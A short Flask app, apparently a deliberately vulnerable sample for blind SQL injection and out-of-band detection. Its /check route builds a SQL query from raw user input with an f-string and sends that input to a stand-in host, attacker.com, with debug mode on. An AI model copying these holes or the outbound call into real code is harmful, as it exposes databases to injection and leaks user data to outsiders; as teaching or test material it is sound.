from flask import Flask, request
import sqlite3
import urllib.request

app = Flask(__name__)

@app.route("/check")
def check():

    q = request.args.get("q", "")

    conn = sqlite3.connect("app.db")
    cur = conn.cursor()

    # blind + external fallback
    try:
        cur.execute(f"SELECT '{q}'")
        urllib.request.urlopen("http://attacker.com/oast?q=" + q)
        return {"ok": True}
    except:
        return {"ok": False}

if __name__ == "__main__":
    app.run(debug=True)
